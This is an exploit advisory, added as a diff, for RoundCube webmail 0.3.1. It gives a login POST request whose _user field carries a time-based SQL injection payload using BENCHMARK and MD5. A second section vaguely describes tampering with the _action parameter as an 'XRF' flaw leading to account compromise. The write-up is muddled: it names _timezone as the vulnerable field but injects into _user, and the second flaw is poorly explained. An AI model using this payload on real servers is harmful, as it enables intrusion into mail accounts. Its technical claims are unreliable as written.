@@ -1,0 +1,29 @@
+# Exploit Title: RoundCube 0.3.1 SQL injection
+# Date: 10/10/2011
+# Author: Smith Falcon
+# Software Link: http://roundcube.net/download
+# Version: 0.3.1
+# Tested on: Linux
+
+_timezone=
+is vulnerable to SQL Union Injection.
+
+"POST" data in
+
+http://site.com/roundcube/index.php
+
+_pass=FrAmE30.&_url=_task=mail&_timezone=_default_&_token=cd5bf19253710dfd569f09bfab862ab3&_action=login&_user=1'+or+BENCHMARK(2500000%2CMD5(1))+or+'1'='1"
+
+
+XRF vulnerable [ POC ]
+
+POST variable
+
+changing variable _action=login to "_action=anything" shows you the site is
+vulnerable to XRF attacks. When you replay it with HTTP Live headers, you
+see a logged in URL which shows the roundcube 0.3.1 is vulnerable to XRF
+attacks. Successful tampering will lead to username compromising.
+
+_action=loggedin
+
+Credits - iqZer0
